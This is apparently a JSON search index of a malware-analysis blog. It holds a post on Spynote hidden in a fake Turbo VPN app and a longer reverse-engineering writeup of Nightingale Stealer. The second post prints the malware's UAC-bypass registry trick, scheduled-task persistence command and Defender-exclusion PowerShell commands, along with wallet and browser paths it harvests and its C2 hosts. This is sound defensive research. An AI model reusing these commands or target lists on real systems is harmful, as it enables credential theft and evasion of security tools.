[ { "title": "Spynote Android Malware Masquerades as VPN Amid Turkey&#39;s Instagram Ban", "url": "/posts/spynote-android-malware/", "categories": "Reverse Engineering, Malware Hunting", "tags": "reverse engineering, malware hunting", "date": "2024-08-08 19:00:00 +0300", "snippet": "Hunting for Real-Life ExampleOn August 2, 2024, Instagram was blocked in Turkey following a disagreement over content moderation. Immediately, users sought alternative methods to regain access, including changing DNS settings and relying on VPN services. While VPNs are a popular choice for bypassing such restrictions, cybersecurity professionals have consistently highlighted the dangers, especially when using unreliable VPN providers. This environment has allowed cyber attackers to take advantage of the increased demand for VPNs by distributing malware under the guise of legitimate VPN applications, putting users at significant risk.To identify a real example of this threat, we can conduct a quick hunt on VirusTotal by crafting a query that targets malicious APK files. The search should focus on files first detected within the last seven days, containing the keyword vpn and initially submitted from Turkey. The following query will be used:type:apk positives:10+ name:&quot;*vpn*&quot; first_submitter:tr fs:7d+Running this query reveals an APK file named turbo-vpn-4-1-1-1.apk submitted from Turkey on 2024-08-08 at 14:44:59, and flagged as malicious by 18 out of 67 antivirus engines. This detection rate indicates a significant likelihood that the file is indeed harmful.Antivirus engines recognized this file as Spynote Android malware, a well-known remote access trojan (RAT) that grants attackers full control over the infected device. Spynote is capable of stealing personal data, such as SMS messages, contacts, and call logs, and can even remotely activate the device’s microphone and camera. Its comprehensive spying capabilities make it a severe threat to user privacy and security.Technical Analysis: An OverviewIn this section, we will not be conducting an exhaustive technical analysis of the Spynote malware, as it has already been extensively covered in numerous research articles. Instead, our focus will be on a specific aspect of the sample: how the threat actor injected Spynote into the Turbo VPN application.We’ll begin by decompressing the APK to identify the injected component—specifically, a malicious activity within the app—and then proceed to extract the C2 address used by the malware. For more detailed technical analysis of Spynote, you can check the references provided.Upon decompressing and decompiling the APK file with JADX-GUI, we discovered multiple references to effectservicecimpl.marketpush and its associated obfuscated functions. These findings indicate that this component is integral to the app’s malicious activities, potentially serving as a gateway to execute the malware’s commands or communicate with the C2 server.Within the effectservicecimpl.marketpush component, we found Base64 encoded strings in the service class “khfzmkeaimhfzdqcknixxmdvn3” that correspond to the C2 server’s address and port. Decoding them shows that the malware connects to a C2 server at 62.60.186.234 via port 7771.By searching the identified IP address in VirusTotal and exploring its related files, we found another malicious file named build.exe / Steanings.exe which has been flagged as the Redline Stealer.This connection suggests that the threat actors are using the same infrastructure to distribute different forms of malware, expanding their attack surface.ConclusionAs we’ve explored, the Spynote Android malware was successfully injected into a seemingly legitimate Turbo VPN application, highlighting the dangers of using untrusted apps, especially in times of heightened demand, such as during Turkey’s recent Instagram ban. Interestingly, this isn’t the first time Spynote has been used to target unsuspecting users. In 2023, Kaspersky published an article titled “Gaming-related cyberthreats in 2023” where they detailed how Spynote was distributed among Roblox users on the Android platform under the guise of a game mod.This connection is particularly relevant today, as Turkey also recently banned Roblox, potentially driving users to seek alternative methods of access, just as they did with Instagram. The parallel between these incidents underscores the need for heightened vigilance in digital security, especially when popular platforms become inaccessible, pushing users towards risky alternatives.In conclusion, whether it’s through fake VPNs or malicious game mods, attackers are quick to exploit any opportunity to spread malware. Users should remain cautious, especially when downloading apps from unverified sources.IOCs5079208324c004d5ae538b48bbfdecdcf0a4e6542dcc283328d77e8398ab9f9262.60.186.234:7771References https://securelist.com/game-related-threat-report-2023/110960/ https://malpedia.caad.fkie.fraunhofer.de/details/apk.spynote I utilized AI assistance to fine-tune certain sentences in this post, enhancing clarity and precision. The banner image was also created using AI. " }, { "title": "Hunt and Analysis - Nightingale Stealer", "url": "/posts/nightingale-stealer-analysis/", "categories": "Reverse Engineering, Malware Hunting", "tags": "reverse engineering, malware hunting", "date": "2024-02-05 19:00:00 +0300", "snippet": "Part 1 - Nightingale StealerSpoiler Alert: If you are familiar with Phemedrone Stealer, be prepared for a revelation. Nightingale Stealer, as it turns out, is essentially an edited version of Phemedrone Stealer. Knowing this beforehand can help manage expectations as you read through this article.On December 15, 2023, a user operating under the alias -Nightingale- posted an advertisement on HackForums for a stealer malware dubbed Nightingale&#39;s Stealer. This threat is designed to exfiltrate credentials from 75 different wallets, alongside passwords, cookies, browser data, and application data from platforms such as Steam, Telegram, and Discord.On January 29, 2024, nearly a month and a half after its initial appearance, Twitter user @suyog41 posted about Nightingale&#39;s Stealer, sharing the hash of the malware sample.In this article, we will concentrate on examining this particular malware sample. We’ll download it from VirusTotal, analyze its components, and decode its operational framework to gain a deeper understanding of its functionalities.Part 2 - Dissecting The First Nightingale’s Stealer SampleUpon searching the hash on VirusTotal, it was found to be flagged as malicious by 52 out of 71 antivirus engines. Intriguingly, Yara Rules indicate that this sample is associated with Phemedrone Stealer, while various collections and comments suggest it might be Formbook. Let’s proceed to download the sample to ascertain its true nature.SHA256: 0cc6d724ac017163b40866c820fd67df6ac89924a623490ec1de2ecacf1d0219Upon opening the file in IDA, an intriguing aspect becomes apparent in the IDA navigator: the code area is noticeably small compared to a significantly larger data area. This characteristic typically indicates one of two possibilities: the file is either encrypted or packed.Unpacking / DecryptionIDA proficiently renamed all functions, streamlining the analysis of the main function. Initially, the main function duplicates two data blobs into memory via memcpy. It then utilizes the first blob as data and the second as an XOR key for decrypting the first blob. Subsequently, the decrypted data is written to a file named sms2A85.tmp (in this instance) located under the \\AppData\\Local\\Temp\\ folder. Following this, the malware initiates a new process with this file.Instead of dedicating time to decrypt the blob through static analysis, we’ll employ the debugger, placing a breakpoint on CreateProcessA. This method facilitates the retrieval of the decrypted file from the \\AppData\\Local\\Temp folder, streamlining our analysis.This approach resulted in the discovery of a new .NET executable file named sms2A85.tmp, advancing our investigation further.SHA256: 1fdd63b4b1db9637871a4f574c746980977accf2a0f6c3ceaef82b6641a3e9e7The file is identified as Phemedrone Stealer by crowdsourced Yara rules and comments in VirusTotal. Keeping this in mind, we will continue with our analysis and circle back to this classification at the end of our investigation.Detailed Analysis of the Extracted .NET FileMoving forward with our analysis, we’ll leverage DNSpy based on the identification of the second file as a .NET executable, as determined by ExeInfo .SHA256: 1fdd63b4b1db9637871a4f574c746980977accf2a0f6c3ceaef82b6641a3e9e7In our examination using dnSpy, we encountered obfuscated function names and observed that nearly all strings utilized within the malware are encrypted. To navigate these hurdles, our initial step will involve dissecting the string decryption routine. This process will enable us to decrypt and appropriately label these strings as we progress through the analysis of the functions. Furthermore, we will assign meaningful names to the functions, enhancing the clarity of our investigation.Upon further scrutiny of the main function, we noticed numerous instances where encrypted strings are passed to a method named Odebelivagy.Bacaruzehakik. This pattern strongly suggests that we have identified the decryption functionThe decryption routine initiates by base64 decoding the encoded data, followed by an XOR decryption process using a hardcoded key.String DecryptionIn order to facilitate a quicker analysis, we intend to rewrite the string decryptor using Python. This adaptation will enhance our ability to navigate through the malware’s obfuscations more swiftly. Additionally, at the end of this article, we will share a Python-based string extractor/decryptor, designed to automate the decryption of the malware’s strings.&amp;gt;&amp;gt;&amp;gt; import base64&amp;gt;&amp;gt;&amp;gt; xor_key = &quot;83o8vqawvcq7uy8f&quot;&amp;gt;&amp;gt;&amp;gt; enc_string = &quot;a1wJTAEQExIq&quot;&amp;gt;&amp;gt;&amp;gt; result = []&amp;gt;&amp;gt;&amp;gt; dec_string = base64.b64decode(enc_string)&amp;gt;&amp;gt;&amp;gt; for i in range(len(dec_string)):... value = dec_string[i] ^ ord(xor_key[i % len(xor_key)])... result.append(chr(value))...&amp;gt;&amp;gt;&amp;gt; print(&#39;&#39;.join(result))Software\\In certain instances, the output from the initial base64 decoding and XOR decryption steps contains special characters, rather than the expected decrypted strings. This anomaly indicates the presence of an additional layer of decryption or decoding. The process involves splitting the resultant string at spaces to isolate the special character set, which is then mapped to corresponding values using a predefined dictionary. This secondary step is crucial for fully deciphering the encrypted data.Given the complexity of the additional decryption/decoding step, we can again turn to Python to reimplement this function.import base64def decrypt_base64(encoded_str): xor_key = &quot;83o8vqawvcq7uy8f&quot; result = [] dec_string = base64.b64decode(encoded_str) for i in range(len(dec_string)): value = dec_string[i] ^ ord(xor_key[i % len(xor_key)]) result.append(chr(value)) return &#39;&#39;.join(result)char_to_word_mapping = { &#39;A&#39;: decrypt_base64(&quot;Fh4=&quot;), &#39;B&#39;: decrypt_base64(&quot;FR1BFg==&quot;), &#39;C&#39;: decrypt_base64(&quot;FR1CFg==&quot;), &#39;D&#39;: decrypt_base64(&quot;FR1B&quot;), &#39;E&#39;: decrypt_base64(&quot;Fg==&quot;), &#39;F&#39;: decrypt_base64(&quot;Fh1CFg==&quot;), &#39;G&#39;: decrypt_base64(&quot;FR5B&quot;), &#39;H&#39;: decrypt_base64(&quot;Fh1BFg==&quot;), &#39;I&#39;: decrypt_base64(&quot;Fh0=&quot;), &#39;J&#39;: decrypt_base64(&quot;Fh5CFQ==&quot;), &#39;K&#39;: decrypt_base64(&quot;FR1C&quot;), &#39;L&#39;: decrypt_base64(&quot;Fh5BFg==&quot;), &#39;M&#39;: decrypt_base64(&quot;FR4=&quot;), &#39;N&#39;: decrypt_base64(&quot;FR0=&quot;), &#39;O&#39;: decrypt_base64(&quot;FR5C&quot;), &#39;P&#39;: decrypt_base64(&quot;Fh5CFg==&quot;), &#39;Q&#39;: decrypt_base64(&quot;FR5BFQ==&quot;), &#39;R&#39;: decrypt_base64(&quot;Fh5B&quot;), &#39;S&#39;: decrypt_base64(&quot;Fh1B&quot;), &#39;T&#39;: decrypt_base64(&quot;FQ==&quot;), &#39;U&#39;: decrypt_base64(&quot;Fh1C&quot;), &#39;V&#39;: decrypt_base64(&quot;Fh1BFQ==&quot;), &#39;W&#39;: decrypt_base64(&quot;Fh5C&quot;), &#39;X&#39;: decrypt_base64(&quot;FR1BFQ==&quot;), &#39;Y&#39;: decrypt_base64(&quot;FR1CFQ==&quot;), &#39;Z&#39;: decrypt_base64(&quot;FR5BFg==&quot;), &#39;1&#39;: decrypt_base64(&quot;Fh5CFVs=&quot;), &#39;2&#39;: decrypt_base64(&quot;Fh1CFVs=&quot;), &#39;3&#39;: decrypt_base64(&quot;Fh1BFVs=&quot;), &#39;4&#39;: decrypt_base64(&quot;Fh1BFls=&quot;), &#39;5&#39;: decrypt_base64(&quot;Fh1BFlg=&quot;), &#39;6&#39;: decrypt_base64(&quot;FR1BFlg=&quot;), &#39;7&#39;: decrypt_base64(&quot;FR5BFlg=&quot;), &#39;8&#39;: decrypt_base64(&quot;FR5CFlg=&quot;), &#39;9&#39;: decrypt_base64(&quot;FR5CFVg=&quot;), &#39;0&#39;: decrypt_base64(&quot;FR5CFVs=&quot;), &#39;a&#39;: decrypt_base64(&quot;Em0=&quot;), &#39;b&#39;: decrypt_base64(&quot;ZhlFEg==&quot;), &#39;c&#39;: decrypt_base64(&quot;ZhkxEg==&quot;), &#39;d&#39;: decrypt_base64(&quot;ZhlF&quot;), &#39;e&#39;: decrypt_base64(&quot;Eg==&quot;), &#39;f&#39;: decrypt_base64(&quot;EhkxEg==&quot;), &#39;g&#39;: decrypt_base64(&quot;Zm1F&quot;), &#39;h&#39;: decrypt_base64(&quot;EhlFEg==&quot;), &#39;i&#39;: decrypt_base64(&quot;Ehk=&quot;), &#39;j&#39;: decrypt_base64(&quot;Em0xZg==&quot;), &#39;k&#39;: decrypt_base64(&quot;Zhkx&quot;), &#39;l&#39;: decrypt_base64(&quot;Em1FEg==&quot;), &#39;m&#39;: decrypt_base64(&quot;Zm0=&quot;), &#39;n&#39;: decrypt_base64(&quot;Zhk=&quot;), &#39;o&#39;: decrypt_base64(&quot;Zm0x&quot;), &#39;p&#39;: decrypt_base64(&quot;Em0xEg==&quot;), &#39;q&#39;: decrypt_base64(&quot;Zm1FZg==&quot;), &#39;r&#39;: decrypt_base64(&quot;Em1F&quot;), &#39;s&#39;: decrypt_base64(&quot;EhlF&quot;), &#39;t&#39;: decrypt_base64(&quot;Zg==&quot;), &#39;u&#39;: decrypt_base64(&quot;Ehkx&quot;), &#39;v&#39;: decrypt_base64(&quot;EhlFZg==&quot;), &#39;w&#39;: decrypt_base64(&quot;Em0x&quot;), &#39;x&#39;: decrypt_base64(&quot;ZhlFZg==&quot;), &#39;y&#39;: decrypt_base64(&quot;ZhkxZg==&quot;), &#39;z&#39;: decrypt_base64(&quot;Zm1FEg==&quot;), &#39;.&#39;: decrypt_base64(&quot;Eh5FFVxc&quot;), &#39;,&#39;: decrypt_base64(&quot;FR5FEltc&quot;), &#39;?&#39;: decrypt_base64(&quot;EhlCFVxb&quot;), &#39;_&#39;: decrypt_base64(&quot;EhlCFTYx&quot;), &#39;:&#39;: decrypt_base64(&quot;EhkwZ1BX&quot;), &#39;;&#39;: decrypt_base64(&quot;Rk0xZg==&quot;), &#39;-&#39;: decrypt_base64(&quot;eE0wEg==&quot;), &#39;/&#39;: decrypt_base64(&quot;HBkwEw==&quot;), &#39;\\\\&#39;: decrypt_base64(&quot;EmxEZihS&quot;), &#39;&amp;amp;&#39;: decrypt_base64(&quot;Rk0RZg==&quot;), &#39;=&#39;: decrypt_base64(&quot;ZhVFElxb&quot;), &#39;)&#39;: decrypt_base64(&quot;HW1K&quot;), &#39;(&#39;: decrypt_base64(&quot;ZhYx&quot;), &#39;+&#39;: decrypt_base64(&quot;HRYxZg==&quot;), &#39;$&#39;: decrypt_base64(&quot;Zm1KHSgv&quot;), &#39;@&#39;: decrypt_base64(&quot;Zm1KZlMvPw==&quot;), &#39;#&#39;: decrypt_base64(&quot;HhlJElA=&quot;), &#39;!&#39;: decrypt_base64(&quot;RhUREg==&quot;), &#39;&quot;&#39;: decrypt_base64(&quot;EGwwRCkuSA==&quot;), &#39; &#39;: decrypt_base64(&quot;EGwwEF8uPl4=&quot;), &#39;&amp;gt;&#39;: decrypt_base64(&quot;EHJG&quot;), &#39;&amp;lt;&#39;: decrypt_base64(&quot;EHFG&quot;)}def decode_text(input_text): words = input_text.split(&#39; &#39;) decoded_chars = [] for word in words: for char, encrypted_word in char_to_word_mapping.items(): if encrypted_word == word: decoded_chars.append(char) break return &#39;&#39;.join(decoded_chars)decoded_text = decode_text(input(&quot;Enc Data: &quot;))print(decoded_text)└─[$]&amp;gt; python3 dec.pyEnc Data: -.-. *^** *^ *** *** * *** *_+^^# *_+^^# ^^ *** @~_* *** * ^ ^ ** ^* ^^* *** *_+^^# *_+^^# *** **** * *^** *^** *_+^^# *_+^^# ^^^ *^^* * ^* *_+^^# *_+^^# ^*^* ^^^ ^^ ^^ *^ ^* ^**Classes\\\\ms-settings\\\\shell\\\\open\\\\commandNow that we have successfully implemented the essential string decoding and decryption mechanisms in Python, we are fully equipped to commence the detailed analysis of the malware’s functionalities.PersistencyInitially, the malware conducts a preliminary check of the current user and the name of the file it is executing from. To ensure its persistence on the host system, it proceeds to create a new registry key at Classes\\ms-settings\\shell\\open\\command with DelegateExecute set to 0. Following this setup, it executes the command cmd.exe /c start computerdefaults.exe, embedding itself further into the system.With Nightingale Stealer’s configurable options accessible via their panel, users can select from various methods of achieving persistency. If the chosen configuration dictates this path, the malware employs an alternative approach. This begins with the creation of a new registry subkey under SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run, followed by the setup of a scheduled task using the command schtasks.exe /create /tn {0} /tr &quot;{1}&quot; /sc MINUTE /mo {2} /ru &quot;System&quot; /F. This adaptable strategy ensures the malware remains operational within the system.Anti CIS and Target CountriesNightingale Stealer determines if there are specific target countries identified for its operation. It conducts a check to ascertain if the compromised device is located within these predefined countries. In the event the location does not match any of the target countries, the malware will cease its activity and exit.The malware then conducts a check on the installed Keyboard Input Layouts to see if they match a predefined list associated with CIS countries.ru-RUuk-UAkk-KZro-MDuz-UZbe-BYaz-Latn-AZhy-AMky-KGtg-Cyrl-TjVM DetectionAfter confirming the current country of the device, the malware methodically checks for an internet connection, continually monitoring until the device secures a connection to the internet. Following this, it embarks on detecting virtual machines by examining information related to the graphics card, aiming to discern whether the system is a real or virtualized environment.VirtualBoxVBoxVMWare VirtualVMwareHyper-V VideoSELECT * FROM Win32_VideoControllerOther Checks and ConfigsTo maintain stealth and efficiency, Nightingale Stealer incorporates multiple checks within its operations. It begins by examining the existence of a Mutex named Usabiribejagamocazo ensuring that only a single instance runs at any given time. Additionally, the malware surveys the running processes, terminating itself if it identifies wireshark or httpdebbugerui to avoid unwanted attention. Lastly, it executes two strategic commands designed to exclude itself from Windows Defender&#39;s scrutiny, further enhancing its covert operation.cmd /k start /b powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath &amp;amp; exitcmd /k start /b powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension .exe &amp;amp; exitData Collection Functions File GrabberOur exploration of Nightingale Stealer’s Data Collection Functions brings us to the File Grabber. This particular function is responsible for harvesting files from the user’s personal and desktop directories.*.txt*.dat*seed**.mafile Wallet GrabberNext up is the Wallet Grabber function in Nightingale Stealer’s Data Collection Functions. It simply looks for wallet data in the user’s ApplicationData and LocalApplicationData folders. It checks both desktop wallet app data and browser wallet extensions.wallet.datWallets/atomic\\Local Storage\\leveldbGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn... FTP GrabberThe FTP Grabber function in Nightingale Stealer collects data from folders such as FTP/ and FileZilla/ located within the AppData directory.\\FileZilla\\sitemanager.xml\\FileZilla\\recentservers.xml\\FileZillaFTP/ Discord &amp;amp; Steam &amp;amp; Telegram GrabberThere are three functions dedicated to data collection from Discord, Steam, and Telegram. These functions gather data from application data folders, registries, and other relevant sources.*cord*HKEY_CURRENT_USER\\Software\\Valve\\SteamSteamPath*ssfn**.vdf\\configSteam/HKEY_CLASSES_ROOT\\tg\\DefaultIconusertagsettingskey_dataprefixMessengers/TGgoods/ Browser Data GrabberNightingale Stealer includes two Browser Data Grabber functions. The first one collects a wide range of browser data, including extensions, autofills, cookies, sessions, and more. The second function specializes in gathering key databases. Additionally, the malware places a specific emphasis on targeting certain extensions, particularly password managers.User DataLocal StateModule Info CacheLast Version1.0.0.0Cookiesautofillcredit_cardsWeb DataBrowser Data/Cookies_AuthenticatorEOS Authenticator... Device Info GrabberNightingale Stealer features two Device Info Grabber functions, responsible for collecting detailed information about the device. This data includes IP addresses, country information, hardware details, and more. The collected information is then prepared for transmission to the command and control (C2) server.IP:queryCountry:countrycountryCodeCity:cityPostal:zipMAC:Username:Windows name:x64Hardware ID:GPU:{0,-25}CPU:RAM:Passwords:Cookies:Credit Cards:AutoFills:ExtensionsWallets:Files:Passwrods Tags:,Cookies Tags:,Antivirus products:,File Location:unknownInformation.txtquerycountrycountryCode*Nightingale Stealer Report* \\| by Nightingale``` - IP: {0} \\({1}\\) - Tag: {2} {3} - Passwords: {4} - Cookies: {5} - Wallets: {6}```UnknownUnknown(querycountrycountryCodeUnknownUnknownUnknown,,querycountryCode(Unknown)-Unknown-Nightingale-Report.ziphttp://ip-api.com/json/?fields=11827UnknownHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersionUnknownroot\\SecurityCenter2displayNameX2:UnknownMemorySELECT * FROM Win32_VideoControllerNameUnknownUnknownSELECT * FROM Win32_ProcessorNameUnknownUnknownSELECT * FROM Win32_ComputerSystemTotalPhysicalMemory0Win32_ProcessorProcessorIdWin32_DiskDriveSerialNumberSELECT * FROMX2Unknown ScreenshotFinally, Nightingale Stealer includes the capability to capture a screenshot of the current view on the device.Data ExfiltrationNightingale Stealer offers three distinct data exfiltration methods: Telegram, Panel, and Server (Gate). In the current instance, stolen data is sent to the threat actor via the Panel method, with the data being exfiltrated to kinggru.duckdns.org through port 3999.Part 3 - String Extractor / DecryptorAs previously mentioned, Nightingale Stealer employs two distinct encoding and encryption routines to conceal strings. To gain a comprehensive view of all the concealed strings within the malware, we will develop a Python-based string extractor/decryptor.import base64import subprocessdef decrypt(encoded_string): decryption_key = &quot;83o8vqawvcq7uy8f&quot; decoded_bytes = base64.b64decode(encoded_string) decrypted_chars = [ chr(byte ^ ord(decryption_key[i % len(decryption_key)])) for i, byte in enumerate(decoded_bytes) ] return &#39;&#39;.join(decrypted_chars)def extract_and_decrypt_strings(file_name): output = subprocess.check_output([&#39;strings&#39;, &#39;-e&#39;, &#39;l&#39;, file_name]) strings = output.decode().splitlines() for string in strings: try: decrypted_string = decrypt(string) if decrypted_string.isascii(): clear_str = decode_text(decrypted_string) if clear_str == &quot;&quot;: print(decrypted_string) else: print(clear_str) except Exception as e: continuechar_to_word_mapping = { &#39;A&#39;: decrypt(&quot;Fh4=&quot;), &#39;B&#39;: decrypt(&quot;FR1BFg==&quot;), &#39;C&#39;: decrypt(&quot;FR1CFg==&quot;), &#39;D&#39;: decrypt(&quot;FR1B&quot;), &#39;E&#39;: decrypt(&quot;Fg==&quot;), &#39;F&#39;: decrypt(&quot;Fh1CFg==&quot;), &#39;G&#39;: decrypt(&quot;FR5B&quot;), &#39;H&#39;: decrypt(&quot;Fh1BFg==&quot;), &#39;I&#39;: decrypt(&quot;Fh0=&quot;), &#39;J&#39;: decrypt(&quot;Fh5CFQ==&quot;), &#39;K&#39;: decrypt(&quot;FR1C&quot;), &#39;L&#39;: decrypt(&quot;Fh5BFg==&quot;), &#39;M&#39;: decrypt(&quot;FR4=&quot;), &#39;N&#39;: decrypt(&quot;FR0=&quot;), &#39;O&#39;: decrypt(&quot;FR5C&quot;), &#39;P&#39;: decrypt(&quot;Fh5CFg==&quot;), &#39;Q&#39;: decrypt(&quot;FR5BFQ==&quot;), &#39;R&#39;: decrypt(&quot;Fh5B&quot;), &#39;S&#39;: decrypt(&quot;Fh1B&quot;), &#39;T&#39;: decrypt(&quot;FQ==&quot;), &#39;U&#39;: decrypt(&quot;Fh1C&quot;), &#39;V&#39;: decrypt(&quot;Fh1BFQ==&quot;), &#39;W&#39;: decrypt(&quot;Fh5C&quot;), &#39;X&#39;: decrypt(&quot;FR1BFQ==&quot;), &#39;Y&#39;: decrypt(&quot;FR1CFQ==&quot;), &#39;Z&#39;: decrypt(&quot;FR5BFg==&quot;), &#39;1&#39;: decrypt(&quot;Fh5CFVs=&quot;), &#39;2&#39;: decrypt(&quot;Fh1CFVs=&quot;), &#39;3&#39;: decrypt(&quot;Fh1BFVs=&quot;), &#39;4&#39;: decrypt(&quot;Fh1BFls=&quot;), &#39;5&#39;: decrypt(&quot;Fh1BFlg=&quot;), &#39;6&#39;: decrypt(&quot;FR1BFlg=&quot;), &#39;7&#39;: decrypt(&quot;FR5BFlg=&quot;), &#39;8&#39;: decrypt(&quot;FR5CFlg=&quot;), &#39;9&#39;: decrypt(&quot;FR5CFVg=&quot;), &#39;0&#39;: decrypt(&quot;FR5CFVs=&quot;), &#39;a&#39;: decrypt(&quot;Em0=&quot;), &#39;b&#39;: decrypt(&quot;ZhlFEg==&quot;), &#39;c&#39;: decrypt(&quot;ZhkxEg==&quot;), &#39;d&#39;: decrypt(&quot;ZhlF&quot;), &#39;e&#39;: decrypt(&quot;Eg==&quot;), &#39;f&#39;: decrypt(&quot;EhkxEg==&quot;), &#39;g&#39;: decrypt(&quot;Zm1F&quot;), &#39;h&#39;: decrypt(&quot;EhlFEg==&quot;), &#39;i&#39;: decrypt(&quot;Ehk=&quot;), &#39;j&#39;: decrypt(&quot;Em0xZg==&quot;), &#39;k&#39;: decrypt(&quot;Zhkx&quot;), &#39;l&#39;: decrypt(&quot;Em1FEg==&quot;), &#39;m&#39;: decrypt(&quot;Zm0=&quot;), &#39;n&#39;: decrypt(&quot;Zhk=&quot;), &#39;o&#39;: decrypt(&quot;Zm0x&quot;), &#39;p&#39;: decrypt(&quot;Em0xEg==&quot;), &#39;q&#39;: decrypt(&quot;Zm1FZg==&quot;), &#39;r&#39;: decrypt(&quot;Em1F&quot;), &#39;s&#39;: decrypt(&quot;EhlF&quot;), &#39;t&#39;: decrypt(&quot;Zg==&quot;), &#39;u&#39;: decrypt(&quot;Ehkx&quot;), &#39;v&#39;: decrypt(&quot;EhlFZg==&quot;), &#39;w&#39;: decrypt(&quot;Em0x&quot;), &#39;x&#39;: decrypt(&quot;ZhlFZg==&quot;), &#39;y&#39;: decrypt(&quot;ZhkxZg==&quot;), &#39;z&#39;: decrypt(&quot;Zm1FEg==&quot;), &#39;.&#39;: decrypt(&quot;Eh5FFVxc&quot;), &#39;,&#39;: decrypt(&quot;FR5FEltc&quot;), &#39;?&#39;: decrypt(&quot;EhlCFVxb&quot;), &#39;_&#39;: decrypt(&quot;EhlCFTYx&quot;), &#39;:&#39;: decrypt(&quot;EhkwZ1BX&quot;), &#39;;&#39;: decrypt(&quot;Rk0xZg==&quot;), &#39;-&#39;: decrypt(&quot;eE0wEg==&quot;), &#39;/&#39;: decrypt(&quot;HBkwEw==&quot;), &#39;\\\\&#39;: decrypt(&quot;EmxEZihS&quot;), &#39;&amp;amp;&#39;: decrypt(&quot;Rk0RZg==&quot;), &#39;=&#39;: decrypt(&quot;ZhVFElxb&quot;), &#39;)&#39;: decrypt(&quot;HW1K&quot;), &#39;(&#39;: decrypt(&quot;ZhYx&quot;), &#39;+&#39;: decrypt(&quot;HRYxZg==&quot;), &#39;$&#39;: decrypt(&quot;Zm1KHSgv&quot;), &#39;@&#39;: decrypt(&quot;Zm1KZlMvPw==&quot;), &#39;#&#39;: decrypt(&quot;HhlJElA=&quot;), &#39;!&#39;: decrypt(&quot;RhUREg==&quot;), &#39;&quot;&#39;: decrypt(&quot;EGwwRCkuSA==&quot;), &#39; &#39;: decrypt(&quot;EGwwEF8uPl4=&quot;), &#39;&amp;gt;&#39;: decrypt(&quot;EHJG&quot;), &#39;&amp;lt;&#39;: decrypt(&quot;EHFG&quot;)}def decode_text(input_text): words = input_text.split(&#39; &#39;) decoded_chars = [] for word in words: for char, encrypted_word in char_to_word_mapping.items(): if encrypted_word == word: decoded_chars.append(char) break return &#39;&#39;.join(decoded_chars)file_name = &quot;dropped_file.exe&quot;extract_and_decrypt_strings(file_name)For the sake of simplicity and code brevity, we utilized the strings -e l command to extract encrypted strings from the malware. However, it’s worth noting that this extraction process can also be implemented in Python.Decrypted Strings:PanelNightingalePanelGateTelegramkinggru.duckdns.org3999%GATE%TokenChat IDInvalid input%TARGET%@anontsugumiAsimuxu50*.txt*seed**.dat*.mafilefalsetrueUsabiribejagamocazoABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz.,?_:;-/\\&amp;amp;=)(+$@#!&quot; &amp;gt;&amp;lt;Classes\\\\ms-settings\\\\shell\\\\open\\\\commandDelegateExecuteSoftware\\Waiting for network connection...Network connection established.8.8.8.8CanadaFranceUSAEnglandGermanyNot connected to network. Waiting for network connection...Password.txtMessengers/Discord Tokens.txtcmd.exe/c start computerdefaults.exewallet.datWallets/\\ArmoryAtomicatomic\\Local Storage\\leveldbBytecoinbytecoinConinomiCoinomi\\Coinomi\\walletsJaxxcom.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldbElectrumElectrum\\walletsExodusExodus\\exodus.walletGuardaGuarda\\Local Storage\\leveldbZcashEthereumEthereum\\keystoreLiqualityGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimnNiftyGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnidOxygenGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbhCrocobitGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkeckeKeplrGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeapFinnieGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmjSwashGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgogStarcoinGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfkSlopeGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgoPhantomGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpaCaratGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\gjdpfnfmelhakanjicgoeepdoninjjodBitfiGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\kffganmbldfgkgineogpgclfkkngcoolGeminiGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\llmlhlddaeediifoladephjpgejknmalRainbowGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\fgmanlmbjbclcnkficdodlognkeheejbRavenGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\gchanpaeodapopimpablnkmenhkndddiTomoGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\kcbnmnnkigeelbhlfllahgejbhdnlhanMonarchGoogle\\Chrome\\User Data\\Default\\Local Extension SettingspgnemdcbsnenjgpajdflhjnelnhkdcbCatalystGoogle\\Chrome\\User Data\\Default\\Local Extension SettingsojhmikaojhghfplekghaghaeogmdhnlRubyGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\gbanjdaphdabiocllfbjolmdjckocjnjCryptonGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\edffijlgmobnajlneenopceappncihfjRumbleGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\mlnmjikdhcblohfpfdfmegjkjlnbbknaLidoGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\fnlgpnbkflbpcpkkohbiojomgeokejjnJellyGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\okompkjedlhgdlkhbanmiboeploplgpcOpenSeaGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\aabeakehlapikpddikddcikneklnfbflSimpleSwapGoogle\\Chrome\\User Data\\Default\\Local Extension 